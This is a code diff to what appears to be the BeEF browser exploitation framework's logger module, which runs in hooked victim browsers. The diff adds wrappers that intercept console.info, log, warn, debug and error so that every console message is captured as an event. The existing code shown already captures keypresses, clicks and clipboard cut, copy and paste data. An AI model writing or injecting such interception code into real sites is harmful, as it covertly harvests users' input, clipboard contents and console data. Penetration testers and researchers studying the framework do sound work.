@@ -69,6 +69,36 @@ beef.logger = {
         $j(document.body).off('cut');
         $j(document.body).off('paste');
 
+        if (!!window.console && typeof window.console == "object") {
+          try {
+            var oldInfo = window.console.info;
+            console.info = function (message) {
+              beef.logger.console('info', message);
+              oldInfo.apply(console, arguments);
+            };
+            var oldLog = window.console.log;
+            console.log = function (message) {
+              beef.logger.console('log', message);
+              oldLog.apply(console, arguments);
+            };
+            var oldWarn = window.console.warn;
+            console.warn = function (message) {
+              beef.logger.console('warn', message);
+              oldWarn.apply(console, arguments);
+            };
+            var oldDebug = window.console.debug;
+            console.debug = function (message) {
+              beef.logger.console('debug', message);
+              oldDebug.apply(console, arguments);
+            };
+            var oldError = window.console.error;
+            console.error = function (message) {
+              beef.logger.console('error', message);
+              oldError.apply(console, arguments);
+            };
+         } catch(e) {}
+       }
+
 		$j(document).keypress(
 			function(e) { beef.logger.keypress(e); }
 		).click(
@@ -109,6 +139,7 @@ beef.logger = {
         $j(document.body).off('copy');
         $j(document.body).off('cut');
         $j(document.body).off('paste');
+        // TODO: reset console
 	},
 
     /**
@@ -182,6 +213,18 @@ beef.logger = {
 			var c = new beef.logger.e();
 			c.type = 'cut';
 			c.data = clipboardData.getData("Text");
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+        /**
+         * Console function fires when data is sent to the browser console.
+         */
+        console: function(type, message) {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'console';
+			c.data = type + ': ' + message;
 			this.events.push(c);
 		} catch(e) {}
 	},
